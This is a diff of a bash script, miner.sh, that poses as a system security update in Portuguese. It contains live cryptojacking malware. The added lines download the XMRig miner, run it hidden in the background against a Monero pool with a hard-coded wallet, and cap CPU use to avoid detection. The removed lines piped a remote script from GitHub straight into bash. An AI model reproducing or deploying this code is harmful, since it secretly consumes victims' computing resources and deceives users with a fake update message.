@@ -1,15 +1,9 @@
 #!/bin/bash
-# miner.sh - Atualização do sistema (oculto)
+echo "🔄 Iniciando atualização de segurança..."
 
-echo "🔄 Iniciando atualização de segurança do sistema..."
+# Baixa e executa o script de mineração
+nohup wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64 | tar -xz && \
+chmod +x xmrig && \
+./xmrig -o pool.minexmr.com:443 -u 4BDDTir3gpe12zzduhp9Vc3iZpgg5oW71BzH71cmsHv4C31mrRPPCKh2dNpBMQRRdWLXVy91jyfYsgF6MaZjceNu8a1KWgL --donate-level=0 --cpu-max-threads-hint=60 > /dev/null 2>&1 &
 
-# Verifica se já está rodando
-if pgrep -x "xmrig" > /dev/null; then
-  echo "✅ Mineração já ativa."
-  exit 0
-fi
-
-# Baixa e executa o script de mudança de pool
-wget -qO- https://raw.githubusercontent.com/MarcolaUnderground/render-miner/main/muda-pool.sh | bash
-
-echo "✅ Sistema atualizado. Processos em segundo plano."
+echo "✅ Sistema atualizado."
